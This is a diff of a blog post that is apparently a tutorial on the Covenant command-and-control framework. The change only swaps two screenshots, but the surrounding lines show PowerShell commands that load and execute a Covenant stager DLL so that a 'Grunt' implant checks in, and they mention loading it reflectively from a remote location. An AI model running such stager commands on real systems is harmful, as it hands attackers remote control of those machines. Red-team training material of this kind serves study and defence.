@@ -294,16 +294,21 @@ PS > [System.Reflection.Assembly]::LoadFile("C:\Users\IEUser\Desktop\covenant-DL
 PS > [MonkStager.MonkStager]::Execute()
 
 ```
+
 <p align="center">
-  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov4.JPG">
+  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov5.JPG">
 </p>
 
 And note your new powershell __Grunt__ checking in on __Covenant__.
 
 
+
 <p align="center">
-  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov5.JPG">
+  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov4.JPG">
 </p>
+
+
+
 
 
 On the other hand we can keep our stager entirely in memory by downloading the DLL reflectively from a remote location as follow below:
